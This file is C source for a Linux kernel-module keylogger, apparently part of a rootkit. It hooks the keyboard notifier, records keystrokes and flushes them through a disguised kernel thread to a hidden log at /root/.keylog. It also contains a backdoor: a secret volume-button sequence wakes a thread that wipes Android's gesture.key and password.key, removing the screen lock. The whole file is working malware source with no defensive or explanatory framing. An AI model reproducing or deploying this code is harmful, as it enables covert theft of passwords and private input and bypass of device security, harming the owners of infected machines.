#include "common.h"
#include "keylog.h"
#include <linux/keyboard.h>
#include <linux/kthread.h>
#include <linux/uaccess.h>

#if defined(_CONFIG_UNLOCK_)
struct task_struct *unlock_ts;
unsigned long sequence_i = 0;
volatile unsigned long to_unlock = 0;

DECLARE_WAIT_QUEUE_HEAD(unlocker_event);

unsigned long sequence[] = {
    42,     // Volume Up downpress
    63232,
    63232,
    58,     // Volume Down downpress
    61959,
    61959,
    42,     // Volume Up uppress
    63232,
    63232,
    58,     // Volume Down uppress
    61959,
    61959
};

#define SEQUENCE_SIZE sizeof(sequence)/sizeof(unsigned long)
#endif

#if defined(_CONFIG_LOGFILE_)
#define FLUSHSIZE 16
#define LOGSIZE   128
#define LOG_FILE "/root/.keylog"

struct task_struct *log_ts;
struct file *logfile;
volatile unsigned long to_flush = 0;
unsigned long logidx = 0;
char logbuf[LOGSIZE];

DECLARE_WAIT_QUEUE_HEAD(flush_event);

/* Translates "normal" (ASCII) keys */
static void ksym_std ( struct keyboard_notifier_param *param, char *buf )
{
    unsigned char val = param->value & 0xff;
    unsigned long len;

    DEBUG_KEY("%s: Logging key '%s'\n", __func__, ascii[val]);

    len = strlcpy(&logbuf[logidx], ascii[val], LOGSIZE - logidx);

    logidx += len;
}

/* Translates F-keys and other top row keys */
static void ksym_fnc ( struct keyboard_notifier_param *param, char *buf )
{
    unsigned char val = param->value & 0xff;
    unsigned long len;

    // Not an F-key
    if ( val & 0xf0 )
        len = strlcpy(&logbuf[logidx], upper[val & 0x0f], LOGSIZE - logidx);
    else // F-key
        len = strlcpy(&logbuf[logidx], fncs[val], LOGSIZE - logidx);

    logidx += len;
}

/* Translates "lock" keys */
static void ksym_loc ( struct keyboard_notifier_param *param, char *buf )
{
    /* XXX: Need lock-key table */
}

/* Translates numpad keys */
static void ksym_num ( struct keyboard_notifier_param *param, char *buf )
{
    /* XXX: Need numpad-key tables (locked or unlocked) */
}

/* Translates arrow keys */
static void ksym_arw ( struct keyboard_notifier_param *param, char *buf )
{
    /* XXX: Need arrow-key table */
}

/* Translates modifier keys */
static void ksym_mod ( struct keyboard_notifier_param *param, char *buf )
{
    /* XXX: Need mod-key table */
}

/* Translates the capslock key */
static void ksym_cap ( struct keyboard_notifier_param *param, char *buf )
{
}

void translate_keysym ( struct keyboard_notifier_param *param, char *buf )
{
    unsigned char type = (param->value >> 8) & 0x0f;

    DEBUG_KEY("Translating keysym %u, BEFORE: logidx=%lu, FLUSHSIZE=%u, LOGSIZE=%u\n", param->value, logidx, FLUSHSIZE, LOGSIZE);

    if ( logidx >= LOGSIZE )
    {
        DEBUG("KEYLOGGER: Failed to log key, buffer is full\n");
        return;
    }

    switch ( type )
    {
        case 0x0:
            ksym_std(param, buf);
            break;

        case 0x1:
            ksym_fnc(param, buf);
            break;

        case 0x2:
            ksym_loc(param, buf);
            break;

        case 0x3:
            ksym_num(param, buf);
            break;

        case 0x6:
            ksym_arw(param, buf);
            break;

        case 0x7:
            ksym_mod(param, buf);
            break;

        case 0xa:
            ksym_cap(param, buf);
            break;

        case 0xb:
            ksym_std(param, buf);
            break;
    }

    DEBUG_KEY("AFTER keysym translate: logidx=%lu, logbuf=%s\n", logidx, logbuf);

    if ( logidx >= FLUSHSIZE && to_flush == 0 )
    {
        DEBUG("Keylog buffer is near full, flush to file\n");

        to_flush = 1;
        wake_up_interruptible(&flush_event);
    }
}

int flusher ( void *data )
{
    loff_t pos = 0;
    mm_segment_t old_fs;
    ssize_t ret;

    while ( 1 )
    {
        wait_event_interruptible(flush_event, (to_flush == 1));

        DEBUG("Inside the flusher thread, flush keylog buffer to file\n");

        if ( logfile )
        {
            old_fs = get_fs();
            set_fs(get_ds());

            ret = vfs_write(logfile, logbuf, logidx, &pos);

            set_fs(old_fs);

            DEBUG("vfs_write ret=%d\n", ret);
        }

        to_flush = 0;
        logidx = 0;

        if ( kthread_should_stop() )
            break;
    }

    return 0;
}
#endif

int notify ( struct notifier_block *nblock, unsigned long code, void *_param )
{
    struct keyboard_notifier_param *param = _param;

    DEBUG_KEY("KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));

    #if defined(_CONFIG_LOGFILE_)
    /* Only log if there is a logfile and the key is pressed down */
    if ( logfile && param->down )
    {
        switch ( code )
        {
            case KBD_KEYCODE:
                break;

            case KBD_UNBOUND_KEYCODE:
            case KBD_UNICODE:
                break;

            case KBD_KEYSYM:
                translate_keysym(param, logbuf);
                break;

            case KBD_POST_KEYSYM:
                break;

            default:
                DEBUG("KEYLOGGER: Received unknown code\n");
                break;
        }
    }
    #endif

    #if defined(_CONFIG_UNLOCK_)
    if ( sequence[sequence_i] == param->value )
    {
        if ( ++sequence_i == SEQUENCE_SIZE )
        {
            DEBUG("Key sequence detected, unlock the screen!\n");

            to_unlock = 1;
            sequence_i = 0;
            wake_up_interruptible(&unlocker_event);
        }
    }
    else
        sequence_i = 0;
    #endif

    return NOTIFY_OK;
}

#if defined(_CONFIG_UNLOCK_)
int unlocker ( void *data )
{
    while ( 1 )
    {
        wait_event_interruptible(unlocker_event, (to_unlock == 1));

        DEBUG("Inside the unlocker thread, removing screen lock\n");

        #if defined(_CONFIG_X86_)
        // Kill screenlock
        #else // ARM
        filp_close(filp_open("/data/system/gesture.key", O_TRUNC, 0), NULL);
        filp_close(filp_open("/data/system/password.key", O_TRUNC, 0), NULL);
        #endif

        to_unlock = 0;

        if ( kthread_should_stop() )
            break;
    }

    return 0;
}
#endif

static struct notifier_block nb = {
    .notifier_call = notify
};

void keylogger_init ( void )
{
    DEBUG("Installing keyboard sniffer\n");

    register_keyboard_notifier(&nb);
    #if defined(_CONFIG_UNLOCK_)
    unlock_ts = kthread_run(unlocker, NULL, "kthread");
    #endif
    #if defined(_CONFIG_LOGFILE_)
    logfile = filp_open(LOG_FILE, O_WRONLY|O_APPEND|O_CREAT, S_IRWXU);
    if ( ! logfile )
        DEBUG("KEYLOGGER: Failed to open log file: %s", LOG_FILE);

    log_ts = kthread_run(flusher, NULL, "kthread");
    #endif
}

void keylogger_exit ( void )
{
    DEBUG("Uninstalling keyboard sniffer\n");

    #if defined(_CONFIG_LOGFILE_)
    kthread_stop(log_ts);

    if ( logfile )
        filp_close(logfile, NULL);
    #endif
    #if defined(_CONFIG_UNLOCK_)
    kthread_stop(unlock_ts);
    #endif
    unregister_keyboard_notifier(&nb);
}
